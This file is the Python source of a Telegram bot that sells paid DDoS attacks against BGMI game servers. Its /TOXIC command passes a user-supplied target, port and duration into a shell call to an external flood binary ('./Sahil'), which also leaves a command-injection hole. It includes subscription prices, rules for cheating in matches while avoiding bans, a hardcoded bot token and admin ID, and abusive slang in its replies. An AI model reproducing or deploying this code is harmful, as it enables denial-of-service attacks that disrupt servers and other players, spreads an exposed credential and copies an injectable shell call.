#@TOXICPLAYER002

import telebot
import subprocess
import datetime
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('7883655316:AAGbLUkf0PiePxih9Z0yzj56IOdWcD-cxpI')

# Admin user IDs
admin_id = {"6882674372"}


USER_FILE = "users.txt"
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "LAWDE TU OWNER NHI HAI 🤣"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove.\n✅ Usage: /remove <userid>'''
    else:
        response = "LAWDE TU OWNER NHI HAI 🤣"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "😎🇲 🇪  🇰 🇷  🇩 🇺 🇳 🇬 🇦  🇹 🇺 🇲  🇧 🇸  🇰 🇭 🇪 🇱 😎"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "T̊⫶Ů⫶ Å⫶P̊⫶N̊⫶Å⫶ D̊⫶E̊⫶K̊⫶H̊⫶ N̊⫶Å⫶ B̊⫶H̊⫶Å⫶I̊⫶"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "LAWDE TU OWNER NHI HAI 🤣"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /TOXIC command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"💀LAWDE TERA 𝐀𝐓𝐓𝐀𝐂𝐊 LAGYA 💀\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: TOXIC\n\n🌟 DEKH BHAI FEEDBACK DENA WARNA MUTE DUGA 10MIN KA..!💀\n\nhttps://t.me/+PKzr132SSLw4NGRl"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /TOXIC command
TOXIC_cooldown = {}

COOLDOWN_TIME =60

# Handler for /TOXIC command
@bot.message_handler(commands=['TOXIC'])
def handle_TOXIC(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in TOXIC_cooldown and (datetime.datetime.now() - TOXIC_cooldown[user_id]).seconds < 3:
                response = "You Are On Cooldown . Please Wait 60seconds Before Running The /TOXIC Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            TOXIC_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 200:
                response = "Error: Time interval must be less than 200."
            else:
                record_command_logs(user_id, '/TOXIC', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./Sahil {target} {port} {time} 877"
                subprocess.run(full_command, shell=True)
                response = f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target}\n𝐏𝐎𝐑𝐓 -> {port}\n𝐓𝐈𝐌𝐄 -> {time}\n\nLAWDE TERA FEEDBACK NHI MIL RHA HAI"
        else:
            response = "✅₣𝙻Å𝕊Ｈ PAID Ɗᴅㅇ𝕊 𝗔𝗖𝗧𝗜𝗩𝗘 ✅\n\n/TOXIC <ϯ𝘢𝒓ᶢ𝘦ϯ> <𝕡𝐨𝒓ϯ> <тᶦм𝒆>\n\nATTACK KAREGA TOH FEEDBACK DENA\n\nhttps://t.me/+PKzr132SSLw4NGRl"  # Updated command syntax
    else:
        response = " LAWDE BAAP KO MSG KARDM - @TOXICPLAYER002 ."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for TOXIC and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "LAWDE TU OWNER NHI HAI 🤣"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /TOXIC : PAPA TOXIC
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''ıllıllı⭐🌟 WELCOME TO TOXIC BOT {user_name}! 🌟⭐ıllıllı\n \nıllıllı⭐🌟 BGMI KI CHUDAYI KARO 🌟⭐ıllıllı\n\n
🤖LAWDE YE USE KAR KE ATTACK KAR: /TOXIC\n\nhttps://t.me/+PKzr132SSLw4NGRl
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. DO DDOS IN 3 MATCH AFTER PLAY 2 MATCH NORMAL OR PLAY 2 TDM MATCH
2. DO LESS THEN 25 KILLS TO AVOID BAN
3. DONT RUN TOO MANY ATTACKS !! CAUSE A BAN FROM BOT
4. DONT RUN 2 ATTACKS AT SAME TIME BECZ IF U THEN U GOT BANNED FROM BOT
5. AFTER 1 OR 2 MATCH CLEAR CACHE OF YOUR GAME 

🟢 FOLLOW THIS RULES TO AVOID 1 MONTH BAN 🟢 

 [ THIS RULES ONLY FOR CLASSIC ,  YOU CAN BRUTAL IN BONUS CHALLENGE AND ULTIMATE ROYALE NO ISSUE!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 🎯彡[ʙʀᴏᴛʜᴇʀ ᴏɴʟʏ 1 ᴘʟᴀɴ ɪꜱ ᴘᴏᴡᴇʀꜰᴜʟʟ ᴛʜᴇɴ ᴀɴʏ ᴏᴛʜᴇʀ ᴅᴅᴏꜱ]彡🎯 !!:

Vip 🌟 :
-> Attack Time : 240 (S)
> After Attack Limit : 5 Min
-> Concurrents Attack : 3

Pr-ice List💸 :
Day-->100 Rs
Week-->600 Rs
Month-->1600 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['S2TOXIC'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "LAWDE TU OWNER NHI HAI 🤣"

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)